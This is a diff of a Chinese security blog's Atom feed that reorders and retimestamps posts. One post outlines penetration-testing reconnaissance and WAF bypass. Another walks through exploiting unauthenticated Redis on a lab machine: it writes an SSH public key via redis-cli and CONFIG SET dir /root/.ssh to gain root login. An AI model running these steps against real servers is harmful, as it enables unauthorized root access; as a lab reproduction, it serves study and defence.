@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://www.wafer.org.cn/"/>
-  <updated>2020-05-07T06:02:58.221Z</updated>
+  <updated>2020-05-07T07:28:14.675Z</updated>
   <id>https://www.wafer.org.cn/</id>
   
   <author>
@@ -21,17 +21,13 @@
     <link href="https://www.wafer.org.cn/2020/05/07/%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%B8%97%E9%80%8F/"/>
     <id>https://www.wafer.org.cn/2020/05/07/%E4%B8%80%E4%B8%AA%E6%8E%88%E6%9D%83%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%B8%97%E9%80%8F/</id>
     <published>2020-05-07T03:36:07.543Z</published>
-    <updated>2020-05-07T06:02:58.221Z</updated>
+    <updated>2020-05-07T07:28:14.675Z</updated>
     
-    <content type="html"><![CDATA[<p>最近面试的时候经常被问着如果拿着一个授权网站你渗透的思路是什么,我一般都是按着我平常的思路进行讲解,感觉很含糊今天这里就打算来总结下.</p><h1 id="一个授权网站如何渗透如何下手"><a href="#一个授权网站如何渗透如何下手" class="headerlink" title="一个授权网站如何渗透如何下手"></a>一个授权网站如何渗透如何下手</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一个网站你能获取最大效果就是你信息收集的如何,这个也是一个站你拿不拿的下的关键因素</p><p>1，获取域名的whois信息,获取注册者邮箱姓名电话等,然后进一步社工获取更多敏感信息,这个为后面挖逻辑漏洞和登录做准备<br>一般都在站长之家(<a href="http://whois.chinaz.com/baidu.com" target="_blank" rel="noopener">http://whois.chinaz.com/baidu.com</a>)</p><p>2.查询服务器旁站以及C段和子域名站点，因为主站一般比较难，所以先看看旁站,C段或者子域名有没有通用性的cms或者其他漏洞。<br>很多情况主战部署了waf而子域名或者旁站并没有部署导致存在一些sql注入漏洞或者其他漏洞进行bypass<br>查询链接云溪(<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a>)</p><p>3.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如<br>IIS: PUT漏洞 短文件名猜解 远程代码执行 解析漏洞<br>apache:  解析漏洞 目录遍历<br>Nginx: 文件解析 目录遍历 CRLF注入 目录穿越<br>Tomcat: 远程代码执行 war后门文件部署  文件包含 文件上传漏洞<br>WebLogic: 反序列化漏洞 SSRF 任意文件上传 弱口令war后门文件部署</p><p>4 查看IP，判断是否存在CDN,如果存在就可以通过证书进行进行寻常真实ip或者fofa等一些搜索引擎来查找,最后通过获取真实IP地址进行端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血,mysql,ftp,ssh,mssql弱口令,7001(weblogic)等等漏洞</p><p>5.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针,接口泄露</p><p>6，google hack 进一步探测网站的信息，后台，敏感文件</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>远程命令执行，弱口令，上传，编辑器漏洞，暴力破解,以及各种建站系统通用漏洞进行组合拳攻击.</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>后面就涉及到拿shell后渗透这里就看自己经验不早描述,其实主要对信息收集做一个总结.</p>]]></content>
+    <content type="html"><![CDATA[<p>最近面试的时候经常被问着如果拿着一个授权网站你渗透的思路是什么,我一般都是按着我平常的思路进行讲解,感觉很含糊今天这里就打算来总结下.</p><a id="more"></a><h1 id="一个授权网站如何渗透如何下手"><a href="#一个授权网站如何渗透如何下手" class="headerlink" title="一个授权网站如何渗透如何下手"></a>一个授权网站如何渗透如何下手</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>一个网站你能获取最大效果就是你信息收集的如何,这个也是一个站你拿不拿的下的关键因素</p><p>1，获取域名的whois信息,获取注册者邮箱姓名电话等,然后进一步社工获取更多敏感信息,这个为后面挖逻辑漏洞和登录做准备<br>一般都在<a href="http://whois.chinaz.com/baidu.com" target="_blank" rel="noopener">站长之家</a></p><p>2.查询服务器旁站以及C段和子域名站点，因为主站一般比较难，所以先看看旁站,C段或者子域名有没有通用性的cms或者其他漏洞。<br>很多情况主战部署了waf而子域名或者旁站并没有部署导致存在一些sql注入漏洞或者其他漏洞进行bypass<br>查询链接<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">云溪</a></p><p>3.查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如<br>IIS: PUT漏洞 短文件名猜解 远程代码执行 解析漏洞<br>apache:  解析漏洞 目录遍历<br>Nginx: 文件解析 目录遍历 CRLF注入 目录穿越<br>Tomcat: 远程代码执行 war后门文件部署  文件包含 文件上传漏洞<br>WebLogic: 反序列化漏洞 SSRF 任意文件上传 弱口令war后门文件部署</p><p>4 查看IP，判断是否存在CDN,如果存在就可以通过证书进行进行寻常真实ip或者fofa等一些搜索引擎来查找,最后通过获取真实IP地址进行端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血,mysql,ftp,ssh,mssql弱口令,7001(weblogic)等等漏洞</p><p>5.扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针,接口泄露</p><p>6，google hack 进一步探测网站的信息，后台，敏感文件</p><h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>远程命令执行，弱口令，上传，编辑器漏洞，暴力破解,以及各种建站系统通用漏洞进行组合拳攻击.</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>后面就涉及到拿shell后渗透这里就看自己经验不早描述,其实主要对信息收集做一个总结.</p>]]></content>
     
     <summary type="html">
     
-      
-      
-        &lt;p&gt;最近面试的时候经常被问着如果拿着一个授权网站你渗透的思路是什么,我一般都是按着我平常的思路进行讲解,感觉很含糊今天这里就打算来总结下.&lt;/p&gt;
-&lt;h1 id=&quot;一个授权网站如何渗透如何下手&quot;&gt;&lt;a href=&quot;#一个授权网站如何渗透如何下手&quot; class=&quot;headerli
-      
+      &lt;p&gt;最近面试的时候经常被问着如果拿着一个授权网站你渗透的思路是什么,我一般都是按着我平常的思路进行讲解,感觉很含糊今天这里就打算来总结下.&lt;/p&gt;
     
     </summary>
     
@@ -129,17 +125,17 @@
   </entry>
   
   <entry>
-    <title>实战bypass云锁</title>
-    <link href="https://www.wafer.org.cn/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/"/>
-    <id>https://www.wafer.org.cn/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/</id>
+    <title>实战sql注入bypass某狗</title>
+    <link href="https://www.wafer.org.cn/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/"/>
+    <id>https://www.wafer.org.cn/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/</id>
     <published>2020-03-27T13:27:17.000Z</published>
-    <updated>2020-04-29T03:05:01.481Z</updated>
+    <updated>2020-04-29T03:05:05.866Z</updated>
     
-    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/1.png" alt="1.png"></p><a id="more"></a><p>由于首发先知,这里不再重复描述.<br><a href="https://xz.aliyun.com/t/7522" target="_blank" rel="noopener">一次实战sql注入bypass云锁</a></p>]]></content>
+    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/1.png" alt="1.png"></p><a id="more"></a><p>由于首发先知,这里不再重复描述.<br><a href="https://xz.aliyun.com/t/7515" target="_blank" rel="noopener">实战sql注入bypass某狗</a></p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;&lt;img src=&quot;/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
+      &lt;p&gt;&lt;img src=&quot;/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
     
     </summary>
     
@@ -152,17 +148,17 @@
   </entry>
   
   <entry>
-    <title>实战sql注入bypass某狗</title>
-    <link href="https://www.wafer.org.cn/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/"/>
-    <id>https://www.wafer.org.cn/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/</id>
+    <title>实战bypass云锁</title>
+    <link href="https://www.wafer.org.cn/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/"/>
+    <id>https://www.wafer.org.cn/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/</id>
     <published>2020-03-27T13:27:17.000Z</published>
-    <updated>2020-04-29T03:05:05.866Z</updated>
+    <updated>2020-04-29T03:05:01.481Z</updated>
     
-    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/1.png" alt="1.png"></p><a id="more"></a><p>由于首发先知,这里不再重复描述.<br><a href="https://xz.aliyun.com/t/7515" target="_blank" rel="noopener">实战sql注入bypass某狗</a></p>]]></content>
+    <content type="html"><![CDATA[<p><img data-src="/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/1.png" alt="1.png"></p><a id="more"></a><p>由于首发先知,这里不再重复描述.<br><a href="https://xz.aliyun.com/t/7522" target="_blank" rel="noopener">一次实战sql注入bypass云锁</a></p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;&lt;img src=&quot;/2020/03/27/%E4%B8%80%E6%AC%A1%E5%AE%9E%E6%88%98sql%E6%B3%A8%E5%85%A5%E7%BB%95%E7%8B%97/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
+      &lt;p&gt;&lt;img src=&quot;/2020/03/27/%E5%AE%9E%E6%88%98bypass%E4%BA%91%E9%94%81/1.png&quot; alt=&quot;1.png&quot;&gt;&lt;/p&gt;
     
     </summary>
     
@@ -317,29 +313,6 @@
   </entry>
   
   <entry>
-    <title>redis未授权访问利用复现</title>
-    <link href="https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
-    <id>https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
-    <published>2019-11-06T07:42:38.171Z</published>
-    <updated>2019-10-11T07:41:37.974Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><a id="more"></a><h2 id="本地漏洞环境搭建"><a href="#本地漏洞环境搭建" class="headerlink" title="本地漏洞环境搭建"></a>本地漏洞环境搭建</h2><p>本文参考了<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener"> bmjoker</a><br>这里主要说一下这篇文章未提及到的坑。</p><p>靶机：Ubuntu</p><p>Ubuntu安装redis</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span></span><br><span class="line">tar xzf redis<span class="number">-3.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd redis<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>修改配置文件，使可以远程访问：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><p>在bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server<br>make结束后，进入src目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br></pre></td></tr></table></figure><p>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/12.png" alt="12.png"><br>返回目录redis-3.2.0，将redis.conf拷贝到/etc/目录下：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/13.png" alt="13.png"></p><p>使用/etc/目录下的reids.conf文件中的配置启动redis服务：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/11.png" alt="11.png"></p><p>服务启动成功，漏洞环境搭建完成</p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="利用”公私钥”认证获取root权限"><a href="#利用”公私钥”认证获取root权限" class="headerlink" title="利用”公私钥”认证获取root权限"></a>利用”公私钥”认证获取root权限</h3><p>先在本地生成一对ssh公钥和私钥，设置密码为空:<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/10.png" alt="10.png"><br>进入.ssh目录：cd /.ssh(这里有个坑如果不是root用户就用 cd ~/.ssh)，将生成的公钥保存到waf.txt:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; waf.txt</span><br></pre></td></tr></table></figure><p>链接靶机上的redis服务，</p><p>将保存ssh的公钥waf.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat waf.txt | redis-cli -h <span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span> -x set s-<span class="type">key</span></span><br></pre></td></tr></table></figure><p>远程登录靶机的redis服务：redis-cli -h 172.22.151.147<br>并使用 CONFIG GET dir 命令得到redis备份的路径：<br>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）:<br>设置上传公钥的备份文件名字为authorized_keys：<br>然后保存 退出</p><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/2.png" alt="2.png"></p><p>这里还有个坑，config set dir /root/.ssh 找不到<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/4.png" alt="4.png"><br>因为这里我是首次安装Ubuntu,没有用root用户登录ssh,现在用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/6.png" alt="6.png"></p><p>现在用这个命令连接，成功免密登录</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa <span class="symbol">root@</span><span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.png" alt="1.png"></p><p>这篇文章到此结束，写的时候之艰难，第一次用hexo写文章。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
-    
-    
-      <category term="漏洞复现" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
-    
-  </entry>
-  
-  <entry>
     <title>一道php反序列化的ctf题</title>
     <link href="https://www.wafer.org.cn/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     <id>https://www.wafer.org.cn/2019/11/06/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
@@ -359,6 +332,29 @@
     
     
       <category term="php代码审计" scheme="https://www.wafer.org.cn/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>redis未授权访问利用复现</title>
+    <link href="https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
+    <id>https://www.wafer.org.cn/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/</id>
+    <published>2019-11-06T07:42:38.171Z</published>
+    <updated>2019-10-11T07:41:37.974Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="redis介绍"><a href="#redis介绍" class="headerlink" title="redis介绍"></a>redis介绍</h1><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><a id="more"></a><h2 id="本地漏洞环境搭建"><a href="#本地漏洞环境搭建" class="headerlink" title="本地漏洞环境搭建"></a>本地漏洞环境搭建</h2><p>本文参考了<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener"> bmjoker</a><br>这里主要说一下这篇文章未提及到的坑。</p><p>靶机：Ubuntu</p><p>Ubuntu安装redis</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http:<span class="comment">//download.redis.io/releases/redis-3.2.0.tar.gz</span></span><br><span class="line">tar xzf redis<span class="number">-3.2</span><span class="number">.0</span>.tar.gz</span><br><span class="line">cd redis<span class="number">-3.2</span><span class="number">.0</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>修改配置文件，使可以远程访问：</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">vim</span> redis.<span class="keyword">conf</span></span><br></pre></td></tr></table></figure><p>在bind 127.0.0.1前面加上#号 protected-mode设为no 启动redis-server<br>make结束后，进入src目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> src</span><br></pre></td></tr></table></figure><p>将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/12.png" alt="12.png"><br>返回目录redis-3.2.0，将redis.conf拷贝到/etc/目录下：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/13.png" alt="13.png"></p><p>使用/etc/目录下的reids.conf文件中的配置启动redis服务：<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/11.png" alt="11.png"></p><p>服务启动成功，漏洞环境搭建完成</p><h2 id="利用姿势"><a href="#利用姿势" class="headerlink" title="利用姿势"></a>利用姿势</h2><h3 id="利用”公私钥”认证获取root权限"><a href="#利用”公私钥”认证获取root权限" class="headerlink" title="利用”公私钥”认证获取root权限"></a>利用”公私钥”认证获取root权限</h3><p>先在本地生成一对ssh公钥和私钥，设置密码为空:<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/10.png" alt="10.png"><br>进入.ssh目录：cd /.ssh(这里有个坑如果不是root用户就用 cd ~/.ssh)，将生成的公钥保存到waf.txt:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>; cat id_rsa.pub; echo -e <span class="string">"<span class="subst">\n</span><span class="subst">\n</span>"</span>) &gt; waf.txt</span><br></pre></td></tr></table></figure><p>链接靶机上的redis服务，</p><p>将保存ssh的公钥waf.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat waf.txt | redis-cli -h <span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span> -x set s-<span class="type">key</span></span><br></pre></td></tr></table></figure><p>远程登录靶机的redis服务：redis-cli -h 172.22.151.147<br>并使用 CONFIG GET dir 命令得到redis备份的路径：<br>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）:<br>设置上传公钥的备份文件名字为authorized_keys：<br>然后保存 退出</p><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/2.png" alt="2.png"></p><p>这里还有个坑，config set dir /root/.ssh 找不到<br><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/4.png" alt="4.png"><br>因为这里我是首次安装Ubuntu,没有用root用户登录ssh,现在用</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh localhost</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/6.png" alt="6.png"></p><p>现在用这个命令连接，成功免密登录</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i id_rsa <span class="symbol">root@</span><span class="number">172.22</span><span class="number">.151</span><span class="number">.147</span></span><br></pre></td></tr></table></figure><p><img data-src="/2019/11/06/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/1.png" alt="1.png"></p><p>这篇文章到此结束，写的时候之艰难，第一次用hexo写文章。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;redis介绍&quot;&gt;&lt;a href=&quot;#redis介绍&quot; class=&quot;headerlink&quot; title=&quot;redis介绍&quot;&gt;&lt;/a&gt;redis介绍&lt;/h1&gt;&lt;p&gt;Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="漏洞" scheme="https://www.wafer.org.cn/categories/%E6%BC%8F%E6%B4%9E/"/>
+    
+    
+      <category term="漏洞复现" scheme="https://www.wafer.org.cn/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
     
   </entry>
   
